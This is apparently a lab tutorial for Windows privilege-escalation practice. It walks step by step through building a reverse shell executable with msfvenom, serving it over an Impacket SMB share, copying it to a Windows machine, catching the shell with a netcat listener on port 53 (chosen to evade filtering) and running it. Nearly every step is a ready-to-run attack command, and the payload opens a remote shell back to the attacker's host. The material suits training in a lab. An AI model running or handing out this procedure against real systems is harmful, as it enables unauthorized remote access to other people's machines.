
---
## 🧰 STEP 1: Generate a Reverse Shell Executable with `msfvenom`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

### ✅ **What this does:**

- **`msfvenom`**: Tool from Metasploit to generate payloads.
    
- **`-p windows/x64/shell_reverse_tcp`**: Payload to open a reverse shell on 64-bit Windows.
    
- **`LHOST=10.10.10.10`**: Your **Kali IP address** (update this to your real one).
    
- **`LPORT=53`**: The **port** you’ll be listening on. Port 53 is often less filtered (commonly used by DNS).
    
- **`-f exe`**: Output format is a **Windows executable (.exe)**.
    
- **`-o reverse.exe`**: Save it to a file called **`reverse.exe`**.
    

---

## 📂 STEP 2: Share the File with the Windows VM Using SMB

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

### ✅ **What this does:**

- **Impacket’s SMB server** allows file sharing over the SMB protocol.
    
- **`kali`** is the **share name**.
    
- **`.`** means share the **current directory** (the one with `reverse.exe`).
    
- **Now Windows can access the file as:**
    
    ```
    \\<Kali_IP>\kali\reverse.exe
    ```
    

⚠️ Make sure firewall or network policies allow SMB (TCP 445) between the machines.

---

## 📥 STEP 3: Copy the File to the Windows VM

On the Windows machine, run:

```cmd
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

### ✅ **Explanation:**

- **`copy`**: Windows built-in command to copy files.
    
- **`\\10.10.10.10\kali\reverse.exe`**: UNC path to your shared file from Kali.
    
- **`C:\PrivEsc\`**: Destination folder on the Windows VM.
    

> 📁 You may need to manually create `C:\PrivEsc` if it doesn't exist.

---

## 🎧 STEP 4: Set Up a Netcat Listener on Kali

```bash
sudo nc -nvlp 53
```

### ✅ **What this does:**

- **`nc` (netcat)**: Tool that listens for incoming connections.
    
- **`-n`**: Do not DNS resolve.
    
- **`-v`**: Verbose output.
    
- **`-l`**: Listen mode.
    
- **`-p 53`**: Port to listen on (same as LPORT in `msfvenom`).
    

This will "catch" the reverse shell when the payload is executed.

---

## 🚀 STEP 5: Run the Payload on Windows

```cmd
C:\PrivEsc\reverse.exe
```

### ✅ **What this does:**

- Executes the **reverse shell binary**, which:
    
    - Connects **back to your Kali IP on port 53**
        
    - Drops you into a **command shell** with the privileges of the current Windows user
        

---

### 🧠 Why This is Important

This reverse shell is a foundational tool you'll use to test **local privilege escalation** in a realistic setup. Once you have a shell:

- You can run **enumeration tools** (like `whoami`, `systeminfo`, `winPEAS`)
    
- Try **exploit paths** (weak services, unquoted paths, misconfigured privileges)
    
- Escalate from `user` to `admin` or `SYSTEM`
    

---
